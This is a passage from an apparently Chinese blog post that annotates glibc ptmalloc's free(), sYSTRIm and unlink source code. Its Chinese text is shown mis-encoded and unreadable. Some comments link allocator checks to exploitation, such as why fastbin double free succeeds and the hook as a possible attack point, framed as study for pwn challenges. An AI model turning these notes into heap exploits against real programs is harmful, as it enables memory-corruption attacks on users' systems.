class="keyword">if</span> (*fb != <span class="literal">NULL</span></span><br><span class="line">	&amp;&amp; __builtin_expect (fastbin_index(chunksize(*fb)) != idx, <span class="number">0</span>)) <span class="comment">// å¦‚æœå½“å‰é“¾è¡¨ä¸ä¸ºç©ºï¼Œä½†æ˜¯ç¬¬ä¸€ä¸ªå †å—çš„ size ä¸ç¬¦åˆæ­¤é“¾è¡¨çš„å¤§å°ï¼Œè¯´æ˜æŸå¤„å‘ç”Ÿäº†é”™è¯¯</span></span><br><span class="line">      &#123;</span><br><span class="line">	errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    p-&gt;fd = *fb;  <span class="comment">// å¦‚æœä»¥ä¸Šæ£€æŸ¥éƒ½æ­£å¸¸ï¼Œå°±å°†å½“å‰ chunk æ’å…¥åˆ° fastbin ä¸­</span></span><br><span class="line">    *fb = p;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™éƒ¨åˆ†ä»£ç æ¯”è¾ƒç®€å•ï¼Œå®ç°çš„åŠŸèƒ½æ˜¯å°†å±äº fastbin çš„ chunk æ’å…¥åˆ° fastbin å¯¹åº”çš„é“¾è¡¨ä¸­å»ï¼Œå½“ free ä¸€ä¸ªå±äº fastbin çš„ chunk æ—¶ï¼Œä¼šé¦–å…ˆæ£€æŸ¥è¿™ä¸ª chunk çš„ä¸‹ä¸€ä¸ª chunk çš„ size æ˜¯å¦æ­£ç¡®ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆåœ¨ä¸€äº› pwn é¢˜ä¸­ä¼ªé€  fastbin chunk çš„æ—¶å€™è¦ä¸€å¹¶ä¼ªé€ å¥½ä¸‹ä¸€ä¸ª chunk çš„ç»“æ„ã€‚</p>
<p>æ¥ç€ä¼šè·å– chunk åœ¨ fastbin ä¸­çš„ indexï¼Œå¹¶ä¸”æ£€æŸ¥è¿™æ¡é“¾è¡¨æ˜¯å¦åˆæ³•ï¼Œå¦‚æœé“¾è¡¨ä¸ä¸ºç©ºä¼šåˆ¤æ–­ç¬¬ä¸€ä¸ªå †å—æ˜¯å¦å±äºå½“å‰é“¾è¡¨ï¼Œå¦‚æœä¸æ˜¯ï¼Œè¯´æ˜å‘ç”Ÿäº†å¼‚å¸¸ã€‚å¦å¤–è¿˜ä¼šåˆ¤æ–­æ­£è¦æ’å…¥çš„ chunk æ˜¯ä¸æ˜¯å·²ç»æ˜¯å½“å‰é“¾è¡¨çš„ç¬¬ä¸€ä¸ªå †å—ï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œè¯´æ˜å‘ç”Ÿäº† double free(<strong>æ³¨æ„ï¼šè¿™é‡Œä»…ä»…æ£€æŸ¥äº†é“¾è¡¨çš„ç¬¬ä¸€ä¸ªå †å—ï¼Œè€Œæ²¡æœ‰éå†æ‰€æœ‰å †å—ï¼Œè¿™å°±æ˜¯ fastbin double free èƒ½å¤ŸæˆåŠŸçš„å…³é”®åŸå› ï¼</strong>)ã€‚</p>
<p>å¦‚æœä¸Šé¢è¿™äº›æ£€æŸ¥éƒ½æ²¡æœ‰é—®é¢˜ï¼Œå°±ä¼šæŠŠ chunk æ’å…¥åˆ°å¯¹åº”çš„ fastbin é“¾è¡¨ä¸­ï¼Œæ³¨æ„ fastbin æ˜¯ä»å¤´éƒ¨æ’å…¥ï¼Œè€Œ malloc ä¹Ÿæ˜¯ä»å¤´éƒ¨å–å‡ºã€‚å¦å¤–ï¼Œä»£ç ä¸­æ¶‰åŠåˆ°äº† ATOMIC_FASTBIN ä¼˜åŒ–çš„é—®é¢˜ï¼Œå®ƒçš„æœºåˆ¶ä¹‹å‰å·²ç»ç®€è¦ä»‹ç»è¿‡ï¼Œåˆ©ç”¨ lock-free åŸºç¡€å®ç°å¯¹ fastbin é“¾è¡¨çš„æ“ä½œï¼Œæˆ‘ä»¬è¿™é‡Œå°±ä¸å»æ·±ç©¶äº†ã€‚</p>
<p>ä¸Šé¢çš„æµç¨‹å¯ä»¥ç”¨è¿™å¼ å›¾ç‰‡è¡¨ç¤º<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_13.png"
                      alt="malloc_free_13.png"
                ></p>
<p>å¦‚æœå¾… free çš„å †å—ä¸å±äº fastbin ï¼Œé‚£ä¹ˆå°±ä¼šè¿›å…¥åˆ°ä¸‹ä¸€æ®µé€»è¾‘ï¼Œä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Consolidate other non-mmapped chunks as they arrive.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;   <span class="comment">// å¦‚æœ chunk ä¸æ˜¯é€šè¿‡ mmap åˆ†é…çš„</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ATOMIC_FASTBINS</span></span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> THREAD_STATS</span></span><br><span class="line">      <span class="keyword">if</span>(!mutex_trylock(&amp;av-&gt;mutex))</span><br><span class="line">	++(av-&gt;stat_lock_direct);</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">	(<span class="type">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">	++(av-&gt;stat_lock_wait);</span><br><span class="line">      &#125;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">      (<span class="type">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">      locked = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);    <span class="comment">// æ‰¾åˆ°å½“å‰ chunk çš„ä¸‹ä¸€ä¸ª chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">       top block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (p == av-&gt;top, <span class="number">0</span>))  <span class="comment">// å¦‚æœä¼ å…¥ free å‡½æ•°çš„ chunk æŒ‡é’ˆæŒ‡å‘ topï¼Œè¡¨ç¤ºå‘ç”Ÿäº†é”™è¯¯</span></span><br><span class="line">      &#123;</span><br><span class="line">	errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">			  &amp;&amp; (<span class="type">char</span> *) nextchunk</span><br><span class="line">			  &gt;= ((<span class="type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))  <span class="comment">// åˆ¤æ–­ next chunk æ˜¯å¦è¶…å‡º arena çš„è¾¹ç•Œ</span></span><br><span class="line">      &#123;</span><br><span class="line">	errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (!prev_inuse(nextchunk), <span class="number">0</span>))  <span class="comment">// åˆ¤æ–­ next chunk çš„ p_inuse ä½æ˜¯å¦å·²ç»è¢«æ ‡è®°(æ­£å¸¸æƒ…å†µä¸‹ä¸€å®šè¢«æ ‡è®°)</span></span><br><span class="line">      &#123;</span><br><span class="line">	errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);  <span class="comment">// å–å‡º next chunk çš„ size</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">	|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))  <span class="comment">// size å¿…é¡»æ»¡è¶³è¦æ±‚</span></span><br><span class="line">      &#123;</span><br><span class="line">	errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))  </span><br><span class="line">      free_perturb (chunk2mem(p), size - SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;    <span class="comment">// åˆ¤æ–­å‰ä¸€ä¸ªå †å—æ˜¯å¦ä¸ºç©ºé—²ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™å°è¯•è¿›è¡Œåˆå¹¶</span></span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">      unlink(p, bck, fwd);   <span class="comment">// æ³¨æ„è¿™é‡Œä½¿ç”¨äº† unlink æ“ä½œ</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;  <span class="comment">// å¦‚æœåä¸€ä¸ªå †å—ä¸æ˜¯ top</span></span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123;    <span class="comment">// åˆ¤æ–­åä¸€ä¸ªå †å—æ˜¯å¦å¤„äºç©ºé—²çŠ¶æ€</span></span><br><span class="line">	unlink(nextchunk, bck, fwd);  <span class="comment">// ä¾æ—§æ˜¯ unlink æ“ä½œï¼Œå’Œåä¸€ä¸ª chunk è¿›è¡Œåˆå¹¶</span></span><br><span class="line">	size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">	clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">	Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">	not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">	been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">      bck = unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (fwd-&gt;bk != bck, <span class="number">0</span>))</span><br><span class="line">	&#123;</span><br><span class="line">	  errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">	  <span class="keyword">goto</span> errout;</span><br><span class="line">	&#125;</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">	&#123;</span><br><span class="line">	  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">// ä»¥ä¸Šä»£ç å°†åˆå¹¶åçš„(æˆ–è€…æ²¡æœ‰åˆå¹¶) chunk æ’å…¥åˆ° unsorted bin ä¸­ï¼Œå¦‚æœåˆå¹¶åçš„ chunk å±äº large chunkï¼Œä¼šå°† fd_nextsize å’Œ bk_nextsize è¿›è¡Œæ¸…ç©ºï¼Œå› ä¸ºè¿™ä¸¤ä¸ªå­—æ®µåœ¨ unsorted bin ä¸­æ— ç”¨</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;   <span class="comment">// å¦‚æœ free çš„ chunk æ­£å¥½ä½äº top chunk ä¸Šæ–¹ï¼Œå°±ç›´æ¥å’Œ top åˆå¹¶ï¼Œè¿™ä¸€ç‚¹åœ¨ pwn é¢˜ä¸­æ¯”è¾ƒé‡è¦</span></span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;  <span class="comment">// å¦‚æœç»è¿‡åˆå¹¶çš„å †å—å¤§å°è¶…è¿‡äº† FASTBIN_CONSOLIDATION_THRESHOLD é˜ˆå€¼(64 KB)</span></span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))    <span class="comment">// å¦‚æœæ­¤æ—¶ fastbin é“¾è¡¨ä¸ä¸ºç©ºï¼Œå°±ä¼šè°ƒç”¨ consolidate åˆå¹¶ fastbin ä¸­çš„ chunk</span></span><br><span class="line">	malloc_consolidate(av); <span class="comment">// è°ƒç”¨ consolidateï¼Œå°† fastbin chunk åˆå¹¶åˆ° unsorted bin</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;   <span class="comment">// å¦‚æœå½“å‰åˆ†é…åŒºæ˜¯ä¸»åˆ†é…åŒº</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MORECORE_CANNOT_TRIM </span></span><br><span class="line">	<span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(chunksize(av-&gt;top)) &gt;= </span><br><span class="line">	    (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.trim_threshold))   <span class="comment">// å¦‚æœå½“å‰ top chunk å¤§å°å¤§äº heap çš„æ”¶ç¼©é˜ˆå€¼(å¯ä»¥ç»“åˆä¸Šé¢çš„ brk å›¾ç¤ºç†è§£)ï¼Œå°±ä¼šè°ƒç”¨ sYSTRIm æ”¶ç¼© heap</span></span><br><span class="line">	  sYSTRIm(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">	   large, because the corresponding heap might go away.  */</span></span><br><span class="line">	heap_info *heap = heap_for_ptr(top(av));    <span class="comment">// å¦‚æœå½“å‰åˆ†é…åŒºä¸æ˜¯ä¸»åˆ†é…åŒºï¼Œå°±è°ƒç”¨ heap_trim æ”¶ç¼© sub_heap</span></span><br><span class="line"></span><br><span class="line">	assert(heap-&gt;ar_ptr == av);</span><br><span class="line">	heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ATOMIC_FASTBINS</span></span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      assert (locked);</span><br><span class="line">      (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>ä¸Šé¢ä¸€æ®µä»£ç æ¯”è¾ƒé•¿ï¼Œä½†æ˜¯å®ç°çš„åŠŸèƒ½å¾ˆç®€å•ï¼Œå¦‚æœä»£ç èƒ½å¤Ÿæ‰§è¡Œåˆ°è¿™é‡Œï¼Œè¯´æ˜ç”¨æˆ·æƒ³è¦ free çš„ chunk å¤§å°ä¸å±äº fastbinï¼Œæ­¤æ—¶ ptmalloc ä¼šåˆ†åˆ«åˆ¤æ–­å½“å‰ chunk ç‰©ç†ç›¸é‚»çš„å †å—æ˜¯å¦ç©ºé—²ï¼Œå¦‚æœæ˜¯ï¼Œå°±ä¼šè°ƒç”¨ unlink å°†è¿™äº›å †å—ä»å®ƒä»¬çš„é“¾è¡¨ä¸­å¸ä¸‹ï¼Œç„¶åå’Œå½“å‰ chunk åˆå¹¶ï¼Œå¦‚æœå’Œ top chunk ç´§é‚»ï¼Œå°±ä¼šå’Œ top chunk è¿›è¡Œåˆå¹¶ã€‚</p>
<p>å½“ chunk çš„åˆå¹¶å®Œæˆä¹‹åï¼Œåˆå¹¶å‡ºæ¥çš„ chunk å¾ˆæœ‰å¯èƒ½ä¼šå¾ˆå¤§(ä¹‹å‰å·²ç»ç”³è¯·å’Œé‡Šæ”¾äº†è®¸å¤š chunk)ï¼Œå¦‚æœè¿™ä¸ª chunk å¤§å°è¶…å‡ºäº† FASTBIN_CONSOLIDATION_THRESHOLD é˜ˆå€¼ï¼Œå¹¶ä¸” fastbin ä¸­è¿˜æœ‰å †å—ï¼Œé‚£å°±ä¼šè°ƒç”¨ consolidate åˆå¹¶ fastbin ä¸­çš„ chunkã€‚</p>
<p>åœ¨åˆå¹¶æ“ä½œå®Œæˆä¹‹åï¼Œè¿˜ä¼šåˆ¤æ–­å½“å‰åˆ†é…åŒºæ˜¯ä¸æ˜¯ä¸»åˆ†é…åŒºï¼Œå¦‚æœæ˜¯ï¼Œå¹¶ä¸” top chunk çš„å¤§å°å·²ç»è¶…è¿‡äº† heap çš„æ”¶ç¼©é˜ˆå€¼ï¼Œå°±è°ƒç”¨ sYSTRIm æ”¶ç¼© heapï¼Œä¸æ˜¯ä¸»åˆ†é…åŒºï¼Œä¹Ÿä¼šä½¿ç”¨ heap_trim æ¥æ”¶ç¼© sub_heap.</p>
<p>ä»¥ä¸Šæ˜¯å¾… free chunk ä¸æ˜¯ç”± mmap åˆ†é…çš„æƒ…å†µï¼Œå¦‚æœæ˜¯ç”± mmap åˆ†é…çš„å †å—ï¼Œä¼šè°ƒç”¨å‡½æ•° munmap_chunk</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> HAVE_MMAP</span></span><br><span class="line">    munmap_chunk (p);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªå‡½æ•°ä¸»è¦ç”¨æ¥å›æ”¶ mmap åˆ†é…çš„ç©ºé—´ã€‚</p>
<p>ç»“åˆè¿™å¼ å›¾ç‰‡ç†è§£<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_14.png"
                      alt="malloc_free_14.png"
                ></p>
<h2 id="sYSTRIm"><a href="#sYSTRIm" class="headerlink" title="sYSTRIm"></a>sYSTRIm</h2><p>è¿™ä¸ªå‡½æ•°å¯ä»¥è§†ä¸º sYSMALLOc å‡½æ•°çš„é€†è¿‡ç¨‹ï¼Œè´Ÿè´£å°†å†…å­˜è¿”è¿˜ç»™æ“ä½œç³»ç»Ÿã€‚</p>
<p>æ‘˜å½• ptmalloc çš„æ³¨é‡Šå¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sYSTRIm is an inverse of sorts to sYSMALLOc.  It gives memory back</span><br><span class="line">  to the system (via negative arguments to sbrk) if there is unused</span><br><span class="line">  memory at the `high&#x27; end of the malloc pool. It is called</span><br><span class="line">  automatically by free() when top space exceeds the trim</span><br><span class="line">  threshold. It is also called by the public malloc_trim routine.  It</span><br><span class="line">  returns 1 if it actually released any memory, else 0.</span><br></pre></td></tr></table></figure></div>

<p>å‡½æ•°çš„ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> __STD_C</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">sYSTRIm</span><span class="params">(<span class="type">size_t</span> pad, mstate av)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">sYSTRIm</span><span class="params">(pad, av)</span> <span class="type">size_t</span> pad; mstate av;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span>  top_size;        <span class="comment">/* Amount of top-most memory */</span></span><br><span class="line">  <span class="type">long</span>  extra;           <span class="comment">/* Amount to release */</span></span><br><span class="line">  <span class="type">long</span>  released;        <span class="comment">/* Amount actually released */</span></span><br><span class="line">  <span class="type">char</span>* current_brk;     <span class="comment">/* address returned by pre-check sbrk call */</span></span><br><span class="line">  <span class="type">char</span>* new_brk;         <span class="comment">/* address returned by post-check sbrk call */</span></span><br><span class="line">  <span class="type">size_t</span> pagesz;</span><br><span class="line"></span><br><span class="line">  pagesz = mp_.pagesize;  <span class="comment">//è·å–ä¸€å†…å­˜é¡µçš„å¤§å°</span></span><br><span class="line">  top_size = chunksize(av-&gt;top);  <span class="comment">// è·å– topchunk çš„ size</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Release in pagesize units, keeping at least one page */</span></span><br><span class="line">  extra = ((top_size - pad - MINSIZE + (pagesz<span class="number">-1</span>)) / pagesz - <span class="number">1</span>) * pagesz; <span class="comment">// è®¡ç®— top chunk ä¸­æœ€å¤§å¯é‡Šæ”¾çš„æ•´æ•°é¡µçš„æ•°é‡</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (extra &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Only proceed if end of memory is where we last set it.</span></span><br><span class="line"><span class="comment">      This avoids problems if there were foreign sbrk calls.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    current_brk = (<span class="type">char</span>*)(MORECORE(<span class="number">0</span>));  <span class="comment">// è·å– brk çš„å€¼</span></span><br><span class="line">    <span class="keyword">if</span> (current_brk == (<span class="type">char</span>*)(av-&gt;top) + top_size) &#123; <span class="comment">// å¦‚æœå’Œæ­¤æ—¶ top chunk çš„ç»“æŸåœ°å€ç›¸åŒï¼Œè¯´æ˜å¯ä»¥æ‰§è¡Œ heap æ”¶ç¼©</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">	Attempt to release memory. We ignore MORECORE return value,</span></span><br><span class="line"><span class="comment">	and instead call again to find out where new end of memory is.</span></span><br><span class="line"><span class="comment">	This avoids problems if first call releases less than we asked,</span></span><br><span class="line"><span class="comment">	of if failure somehow altered brk value. (We could still</span></span><br><span class="line"><span class="comment">	encounter problems if it altered brk in some very bad way,</span></span><br><span class="line"><span class="comment">	but the only thing we can do is adjust anyway, which will cause</span></span><br><span class="line"><span class="comment">	some downstream failure.)</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">      MORECORE(-extra);  <span class="comment">// è°ƒç”¨ sbrk é‡Šæ”¾å†…å­˜</span></span><br><span class="line">      <span class="comment">/* Call the `morecore&#x27; hook if necessary.  */</span></span><br><span class="line">      <span class="type">void</span> (*hook) (<span class="type">void</span>) = force_reg (__after_morecore_hook);</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">	(*hook) ();   <span class="comment">// æ‰§è¡Œ more_hook (èƒ½å¦æˆä¸ºæ–°çš„æ”»å‡»ç‚¹å‘¢ï¼Ÿ)</span></span><br><span class="line">      new_brk = (<span class="type">char</span>*)(MORECORE(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (new_brk != (<span class="type">char</span>*)MORECORE_FAILURE) &#123;</span><br><span class="line">	released = (<span class="type">long</span>)(current_brk - new_brk);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (released != <span class="number">0</span>) &#123;</span><br><span class="line">	  <span class="comment">/* Success. Adjust top. */</span></span><br><span class="line">	  av-&gt;system_mem -= released;</span><br><span class="line">	  set_head(av-&gt;top, (top_size - released) | PREV_INUSE);</span><br><span class="line">	  check_malloc_state(av);</span><br><span class="line">	  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªå‡½æ•°çš„æµç¨‹ä¹Ÿæ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œå°±ä¸å†èµ˜è¿°äº†ã€‚<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_15.png"
                      alt="malloc_free_15.png"
                ></p>
<h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><p>unlink æ˜¯ç”±ä¸€ä¸ªç‹¬ç«‹çš„å®å®ç°çš„ï¼Œå®ƒçš„ä¸»è¦åŠŸèƒ½å°±æ˜¯å°†ä¸€ä¸ªç©ºé—²çš„ chunk ä»å®ƒçš„é“¾è¡¨ä¸­å¸ä¸‹æ¥ï¼Œä»¥ä¾¿äºå’Œå…¶ä»–  chunk è¿›è¡Œåˆå¹¶ï¼ŒUnlink ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">  FD = P-&gt;fd;                                                          \</span></span><br><span class="line"><span class="meta">  BK = P-&gt;bk;                                                          \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                \</span></span><br><span class="line"><span class="meta">    malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P); \</span></span><br><span class="line"><span class="meta">  <span class="keyword">else</span> &#123;                                                               \</span></span><br><span class="line"><span class="meta">    FD-&gt;bk = BK;                                                       \</span></span><br><span class="line"><span class="meta">    BK-&gt;fd = FD;                                                       \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)				       \</span></span><br><span class="line"><span class="meta">	&amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;	       \</span></span><br><span class="line"><span class="meta">      assert (P-&gt;fd_nextsize-&gt;bk_nextsize == P);		       \</span></span><br><span class="line"><span class="meta">      assert (P-&gt;bk_nextsize-&gt;fd_nextsize == P);		       \</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;				       \</span></span><br><span class="line"><span class="meta">	<span class="keyword">if</span> (P-&gt;fd_nextsize == P)				       \</span></span><br><span class="line"><span class="meta">	  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		       \</span></span><br><span class="line"><span class="meta">	<span class="keyword">else</span> &#123;							       \</span></span><br><span class="line"><span class="meta">	  FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			       \</span></span><br><span class="line"><span class="meta">	  FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			       \</span></span><br><span class="line"><span class="meta">	  P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			       \</span></span><br><span class="line"><span class="meta">	  P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			       \</span></span><br><span class="line"><span class="meta">	&#125;							       \</span></span><br><span class="line"><span class="meta">      &#125;	<span 